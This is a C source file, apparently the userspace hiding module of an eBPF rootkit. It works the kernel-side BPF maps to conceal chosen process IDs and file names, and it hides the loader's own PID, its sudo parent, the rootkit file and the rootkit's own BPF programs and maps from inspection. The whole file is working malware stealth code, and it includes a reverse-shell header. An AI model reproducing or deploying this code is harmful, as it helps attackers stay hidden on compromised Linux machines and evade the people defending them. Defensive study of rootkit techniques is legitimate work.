#include <arpa/inet.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <linux/types.h>
#include <unistd.h>

#include "config.h"
#include "rootkit.skel.h"
#include "userspace/hider.h"
#include "userspace/reverse_shell.h"

static int update_string_map(int map_fd, const char *str_val) {
    if (map_fd < 0 || !str_val)
        return -EINVAL;

    char key[MAX_HIDDEN_FILE_NAME_LEN] = {0};

    if (strlen(str_val) >= MAX_HIDDEN_FILE_NAME_LEN)
        return -ENAMETOOLONG;

    snprintf(key, sizeof(key), "%s", str_val);

    uint8_t value = 1;
    return bpf_map_update_elem(map_fd, key, &value, BPF_ANY);
}

static int delete_string_map(int map_fd, const char *str_val) {
    if (map_fd < 0 || !str_val)
        return -EINVAL;

    char key[MAX_HIDDEN_FILE_NAME_LEN] = {0};

    if (strlen(str_val) >= MAX_HIDDEN_FILE_NAME_LEN)
        return -ENAMETOOLONG;

    snprintf(key, sizeof(key), "%s", str_val);

    return bpf_map_delete_elem(map_fd, key);
}

static int update_uint32_map(int map_fd, uint32_t key) {
    if (map_fd < 0)
        return -EINVAL;

    uint8_t value = 1;
    return bpf_map_update_elem(map_fd, &key, &value, BPF_ANY);
}

static int hide_bpf_maps(hider_context_t *hider_ctx) {
    if (!hider_ctx)
        return -EINVAL;

    if (!hider_ctx->skel->obj)
        return -EINVAL;

    struct bpf_map *map = NULL;
    int ret = 0;

    bpf_object__for_each_map(map, hider_ctx->skel->obj) {
        struct bpf_map_info info = {};
        uint32_t len = sizeof(info);
        int fd = bpf_map__fd(map);

        if (fd >= 0 && bpf_obj_get_info_by_fd(fd, &info, &len) == 0) {
            int err = update_uint32_map(hider_ctx->hide_bpf_map_fd, info.id);
            if (err != 0) {
                ret = err;
            }
        }
    }

    return ret;
}

static int hide_bpf_programs(hider_context_t *hider_ctx) {
    if (!hider_ctx)
        return -EINVAL;

    if (!hider_ctx->skel->obj)
        return -EINVAL;

    struct bpf_program *prog = NULL;
    int ret = 0;

    bpf_object__for_each_program(prog, hider_ctx->skel->obj) {
        struct bpf_prog_info info = {};
        uint32_t len = sizeof(info);
        int fd = bpf_program__fd(prog);

        if (fd >= 0 && bpf_obj_get_info_by_fd(fd, &info, &len) == 0) {
            int err = update_uint32_map(hider_ctx->hide_bpf_map_fd, info.id);
            if (err != 0) {
                ret = err;
            }
        }
    }

    return ret;
}

static int hide_bpf(hider_context_t *hider_ctx) {
    if (!hider_ctx)
        return -EINVAL;

    if (!hider_ctx->is_initialized)
        return -EINVAL;

    int ret = 0;
    ret = hide_bpf_programs(hider_ctx);
    if (ret)
        return ret;

    ret = hide_bpf_maps(hider_ctx);
    return ret;
}

/**
 * @brief Set the initail hide state of the rootkit.
 *
 * It sets the loader PID and the loader's elf file to hide.
 *
 * @return int
 */
static int set_initial_hide_state(hider_context_t *hider_ctx) {
    if (!hider_ctx)
        return -EINVAL;

    if (!hider_ctx->is_initialized)
        return -EINVAL;

    int ret = 0;
    pid_t loader_pid = getpid();
    pid_t parent_pid = getppid();

    ret = hider_hide_pid(hider_ctx, loader_pid);
    if (ret != 0)
        return ret;

    /* Hide sudo parent PID, make sure it's not init */
    if (parent_pid > 1) {
        ret = hider_hide_pid(hider_ctx, parent_pid);
        if (ret != 0)
            return ret;
    }

    ret = hider_hide_file(hider_ctx, ROOTKIT_FILE_NAME);
    if (ret != 0)
        return ret;

    ret = hide_bpf(hider_ctx);
    if (ret != 0)
        return ret;

    return 0;
}

int hider_init(hider_context_t *hider_ctx) {
    if (!hider_ctx)
        return -EINVAL;

    if (!hider_ctx->skel)
        return -EINVAL;

    hider_ctx->hide_names_map_fd = bpf_map__fd(hider_ctx->skel->maps.hide_names_map);
    if (hider_ctx->hide_names_map_fd < 0)
        return -EINVAL;

    hider_ctx->hide_bpf_map_fd = bpf_map__fd(hider_ctx->skel->maps.hide_bpf_ids_map);
    if (hider_ctx->hide_bpf_map_fd < 0)
        return -EINVAL;

    hider_ctx->tracked_pids_map_fd = bpf_map__fd(hider_ctx->skel->maps.tracked_pids_map);
    if (hider_ctx->tracked_pids_map_fd < 0)
        return -EINVAL;

    hider_ctx->is_initialized = true;

    return set_initial_hide_state(hider_ctx);
}

int hider_hide_pid(hider_context_t *hider_ctx, pid_t pid) {
    if (!hider_ctx)
        return -EINVAL;

    if (pid <= 0)
        return -EINVAL;

    if (!hider_ctx->is_initialized)
        return -EINVAL;

    int ret = 0;

    char pid_str[MAX_HIDDEN_FILE_NAME_LEN] = {0};
    snprintf(pid_str, sizeof(pid_str), "%d", pid);

    ret = update_string_map(hider_ctx->hide_names_map_fd, pid_str);
    if (ret)
        return ret;

    return update_uint32_map(hider_ctx->tracked_pids_map_fd, (uint32_t)pid);
}

int hider_hide_file(hider_context_t *hider_ctx, const char *filename) {
    if (!hider_ctx)
        return -EINVAL;

    if (!hider_ctx->is_initialized)
        return -EINVAL;

    return update_string_map(hider_ctx->hide_names_map_fd, filename);
}

int hider_unhide_pid(hider_context_t *hider_ctx, pid_t pid) {
    if (!hider_ctx)
        return -EINVAL;

    if (pid <= 0)
        return -EINVAL;

    if (!hider_ctx->is_initialized)
        return -EINVAL;

    char pid_str[MAX_HIDDEN_FILE_NAME_LEN] = {0};
    snprintf(pid_str, sizeof(pid_str), "%d", pid);

    return delete_string_map(hider_ctx->hide_names_map_fd, pid_str);
}

int hider_unhide_file(hider_context_t *hider_ctx, const char *filename) {
    if (!hider_ctx)
        return -EINVAL;

    if (!hider_ctx->is_initialized)
        return -EINVAL;

    return delete_string_map(hider_ctx->hide_names_map_fd, filename);
}
